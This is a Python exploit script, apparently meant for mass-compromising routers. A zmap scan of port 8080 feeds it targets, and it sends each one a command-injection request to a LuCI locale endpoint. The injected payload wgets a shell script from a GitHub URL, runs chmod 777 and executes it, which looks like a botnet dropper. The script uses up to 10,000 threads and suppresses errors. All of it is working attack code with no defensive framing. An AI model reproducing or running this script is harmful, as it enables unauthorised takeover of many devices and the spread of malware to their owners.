import urllib.request
import urllib.error
import fileinput
from io import BytesIO
from threading import Thread
from concurrent.futures import ThreadPoolExecutor

#zmap -p8080 -q | python3 wan.py

payload = "`wget https://raw.githubusercontent.com/20Matrix77/DHJIF/refs/heads/main/skfnw.sh; chmod 777 *; sh skfnw.sh`"

def exploit(target):
    try:
        req = urllib.request.Request("http://"+target+"/cgi-bin/luci/;stok=/locale?form=country")
        req.add_header("User-Agent", "Mozilla/5.0 (X11; Linux x86_64; rv:101.0) Gecko/20100101 Firefox/101.0")
        body = f"operation=write&country=$(id>"+payload+")"

        response = urllib.request.urlopen(req, data=bytes(body, 'utf-8'), timeout=10)

        if response.status == 200:
            print("200 " + target)
    except Exception as e:
        #print(e)
        pass

with ThreadPoolExecutor(max_workers=10000) as executor:
    for line in fileinput.input():
        target = line.rstrip()
        executor.submit(exploit, target)
